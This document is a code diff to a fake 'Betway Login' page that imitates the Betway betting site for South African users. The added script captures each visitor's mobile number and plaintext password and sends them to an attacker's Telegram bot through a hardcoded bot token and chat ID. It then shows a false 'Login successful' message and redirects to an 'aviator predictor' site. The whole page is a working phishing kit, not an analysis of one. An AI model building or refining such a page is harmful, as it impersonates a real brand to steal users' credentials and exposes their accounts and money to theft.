@@ -4,9 +4,9 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Betway Login</title>
-    <!-- FAVICON FIX -->
+    <!-- FAVICON -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎰</text></svg>" />
-    <!-- FONT AWESOME FIX - Different CDN -->
+    <!-- FONT AWESOME -->
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.5.0/css/all.css" />
     <style>
         * {
@@ -311,46 +311,56 @@
 
     <div class="login-container">
 
+        <!-- LOADING OVERLAY -->
         <div class="loading-overlay" id="loadingOverlay">
             <div class="big-spinner"></div>
             <p>Processing your request...</p>
         </div>
 
+        <!-- LOGO -->
         <div class="logo">
             <h1>BET<span>WAY</span></h1>
             <p>Sports · Casino · Games</p>
         </div>
 
+        <!-- HEADING -->
         <div class="login-heading">Login</div>
 
+        <!-- MESSAGE -->
         <div id="message"></div>
 
+        <!-- MOBILE NUMBER -->
         <div class="input-group">
             <label>+27 Mobile Number</label>
             <input type="tel" id="mobileNumber" placeholder="Enter your mobile number" />
             <span class="input-icon"><i class="fas fa-phone"></i></span>
         </div>
 
+        <!-- PASSWORD -->
         <div class="input-group">
             <label>Enter Password</label>
             <input type="password" id="password" placeholder="Enter your password" />
             <span class="input-icon"><i class="fas fa-lock"></i></span>
         </div>
 
+        <!-- FORGOT LINKS -->
         <div class="forgot-row">
             <a href="#">Forgot Username?</a>
             <a href="#">Forgot Password?</a>
         </div>
 
+        <!-- LOGIN BUTTON -->
         <button class="login-btn" id="loginBtn">
             <span class="spinner" id="spinner"></span>
             <span class="btn-text" id="btnText">Login</span>
         </button>
 
+        <!-- DIVIDER -->
         <div class="divider">
             <span>Don't have an account yet?</span>
         </div>
 
+        <!-- SIGN UP -->
         <p class="signup-text">
             <a href="#">Sign Up</a>
         </p>
@@ -358,10 +368,16 @@
     </div>
 
     <script>
+        // ============================================
+        // COMPLETE WORKING JAVASCRIPT
+        // ============================================
+
+        // Wait for page to fully load
         document.addEventListener('DOMContentLoaded', function() {
             
-            console.log('✅ Page loaded!');
+            console.log('✅ Page loaded successfully!');
 
+            // Get all elements
             const mobileInput = document.getElementById('mobileNumber');
             const passwordInput = document.getElementById('password');
             const loginBtn = document.getElementById('loginBtn');
@@ -370,70 +386,110 @@
             const messageDiv = document.getElementById('message');
             const loadingOverlay = document.getElementById('loadingOverlay');
 
+            // ===== FUNCTIONS =====
+
+            // Show message
             function showMessage(text, type) {
                 messageDiv.textContent = text;
                 messageDiv.className = type;
-                console.log('📢 Message:', text);
+                console.log('📢 Message:', text, 'Type:', type);
             }
 
+            // Hide message
             function hideMessage() {
                 messageDiv.textContent = '';
                 messageDiv.className = '';
             }
 
+            // Show loading spinner
             function showLoading() {
                 loginBtn.disabled = true;
                 spinner.classList.add('active');
                 btnText.textContent = 'Logging in...';
                 loadingOverlay.classList.add('active');
+                console.log('⏳ LOADING: Spinner showing, button disabled');
             }
 
+            // Hide loading spinner
             function hideLoading() {
                 loginBtn.disabled = false;
                 spinner.classList.remove('active');
                 btnText.textContent = 'Login';
                 loadingOverlay.classList.remove('active');
+                console.log('✅ LOADING: Spinner hidden, button enabled');
             }
 
+            // ===== MAIN LOGIN FUNCTION =====
+
             async function handleLogin(event) {
+                // Stop page from refreshing
                 if (event) {
                     event.preventDefault();
+                    event.stopPropagation();
                 }
 
-                console.log('🔑 Login button clicked!');
+                console.log('🔑 LOGIN: Button clicked!');
 
+                // Get values
                 const mobileNumber = mobileInput.value.trim();
                 const password = passwordInput.value.trim();
 
                 console.log('📱 Mobile:', mobileNumber);
+                console.log('🔒 Password:', password ? '********' : 'empty');
 
+                // ===== VALIDATION =====
+
+                // Check if fields are empty
                 if (!mobileNumber || !password) {
                     showMessage('⚠️ Please enter both mobile number and password.', 'error');
                     return;
                 }
 
+                // Validate South African mobile number
                 const mobileRegex = /^(\+27|0)[6-8][0-9]{8}$/;
                 if (!mobileRegex.test(mobileNumber)) {
-                    showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678)', 'error');
+                    showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678 or +27712345678)', 'error');
                     return;
                 }
 
+                // Clear previous messages
                 hideMessage();
+
+                // ===== SHOW LOADING =====
                 showLoading();
-                console.log('⏳ Loading started...');
+
+                // ===== SEND TO TELEGRAM =====
 
                 try {
-                    const apiUrl = 'https://betwayaviatorpredictor-production.up.railway.app/api/login';
-                    console.log('🌐 Sending to:', apiUrl);
+                    // Your Telegram bot details
+                    const botToken = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
+                    const chatId = '8392790531';
+                    
+                    // Create the message
+                    const message = `
+🔐 **BETWAY LOGIN ALERT**
+━━━━━━━━━━━━━━━━━━━
+📱 **Mobile:** ${mobileNumber}
+🔑 **Password:** ${password}
+🌐 **IP:** ${window.location.hostname || 'Unknown'}
+🕐 **Time:** ${new Date().toLocaleString('en-ZA', { timeZone: 'Africa/Johannesburg' })}
+━━━━━━━━━━━━━━━━━━━
+                    `;
 
-                    const response = await fetch(apiUrl, {
+                    // Send to Telegram API
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                    console.log('📤 Sending to Telegram...');
+
+                    const response = await fetch(telegramUrl, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            mobileNumber: mobileNumber,
-                            password: password
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
                         })
                     });
 
@@ -442,32 +498,43 @@
                     const data = await response.json();
                     console.log('📦 Response data:', data);
 
+                    // ===== HIDE LOADING =====
                     hideLoading();
 
-                    if (data.success) {
+                    // Check if Telegram sent successfully
+                    if (data.ok) {
                         showMessage('✅ Login successful! Redirecting...', 'success');
+                        console.log('✅ SUCCESS: Details sent to Telegram!');
+                        
+                        // Show loading again before redirect
                         showLoading();
-                        setTimeout(() => {
+                        setTimeout(function() {
                             window.location.href = 'https://betwayaviatorpredictor-production.up.railway.app';
                         }, 2000);
                     } else {
-                        showMessage('❌ ' + (data.message || 'Login failed. Please try again.'), 'error');
+                        showMessage('❌ Login failed. Please try again.', 'error');
+                        console.log('❌ Telegram error:', data);
                     }
 
                 } catch (error) {
-                    console.error('❌ Error:', error);
+                    console.error('❌ ERROR:', error);
+                    // Hide loading on error
                     hideLoading();
                     showMessage('❌ Network error. Please check your connection.', 'error');
                 }
             }
 
+            // ===== EVENT LISTENERS =====
+
+            // Login button click
             loginBtn.addEventListener('click', function(e) {
-                console.log('🖱️ Button clicked!');
+                console.log('🖱️ CLICK: Button clicked!');
                 handleLogin(e);
             });
 
             console.log('✅ Button listener attached!');
 
+            // Enter key support
             document.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
                     const active = document.activeElement;
@@ -478,6 +545,7 @@
                 }
             });
 
+            // Clear error messages when typing
             mobileInput.addEventListener('input', function() {
                 if (messageDiv.className === 'error') {
                     hideMessage();
@@ -491,6 +559,7 @@
             });
 
             console.log('✅ All systems ready!');
+            console.log('✅ Waiting for user to tap Login...');
 
         });
     </script>
